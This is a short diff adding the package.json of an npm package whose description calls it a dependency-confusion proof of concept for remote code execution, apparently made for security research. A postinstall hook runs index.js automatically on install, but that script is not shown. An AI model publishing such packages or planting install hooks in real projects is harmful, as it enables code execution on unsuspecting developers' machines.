@@ -1,0 +1,12 @@
+{
+  "name": "@steiner/steiner",
+  "version": "1.0.0",
+  "description": "Dependency Confusion to RCE By Steiner254",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node index.js"
+  },
+  "publishConfig": {
+    "access": "public"
+  }
+}
